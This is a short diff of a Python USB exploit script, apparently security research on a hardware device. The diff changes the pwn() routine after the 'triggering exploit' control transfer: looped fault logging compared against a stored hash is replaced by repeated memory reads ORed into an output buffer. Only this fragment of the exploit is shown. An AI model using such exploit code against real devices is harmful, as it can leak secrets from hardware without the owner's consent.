@@ -86,28 +86,21 @@ def pwn():
   print("[+] triggering exploit")
   assert len(device.ctrl_transfer(0xA1, 1, 0, 0, len(buf), 1000)) == len(buf)
 
-  gold = "d8ec7d42b3eef93cafc3fa638c69e29e"
+  time.sleep(0.1)
 
-  while 1:
-    time.sleep(1)
-
+  buf = bytearray(64)
+  # we seem to be fighting against something else trying to memset our buffer to 0, so
+  # we read many times and OR the results together
+  for _ in range(10):
     received = device.ctrl_transfer(0xA1, 1, 0, 0, 256, 1000).tobytes()
     assert len(received) == 256
-    print(received.hex())
-    res = received[0x48:0x58].hex()
-    ctr = received[0x40:0x44].hex()
-    #if ctr == "00000000":
-    #  raise Exception("ded")
-    print(ctr, "".join(colored(a, "green" if a == b else "red") for a, b in zip(res, gold)))
-    with open("raw_faults.log", "a") as logfile:
-      logfile.write(res + "\n")
+    for i, x in enumerate(received[192:]):
+      buf[i] |= x
+  
+  print("output:")
+  print(buf.hex())
 
   usb.util.dispose_resources(device)
 
 if __name__ == '__main__':
-  while True:
-    #try:
-      pwn()
-    #except:
-    #  print("DIED")
-      time.sleep(0.5)
+  pwn()
